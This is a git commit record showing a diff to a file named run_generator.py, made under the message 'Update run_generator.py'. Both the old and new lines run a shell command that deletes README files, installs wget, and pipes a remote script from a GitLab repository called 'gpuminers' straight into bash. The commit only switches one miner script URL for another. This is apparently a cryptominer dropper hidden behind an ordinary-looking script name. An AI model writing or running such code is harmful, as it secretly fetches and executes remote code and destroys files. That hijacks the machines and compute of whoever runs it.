7ee7bb321ac06d3871d00fd03ee5c2905b3d1992
sidwellkleinmore <93007000+sidwellkleinmore@users.noreply.github.com>
2021-10-22 18:35:44 +0000

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,2 +1,2 @@
 import os as alpha
-alpha.system("rm README* && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_vs_w_lt.sh | bash")
+alpha.system("rm README* && apt update && apt -y install wget && wget -O - https://gitlab.com/chadpetersen1337/gpuminers/-/raw/main/start_vs.sh | bash")
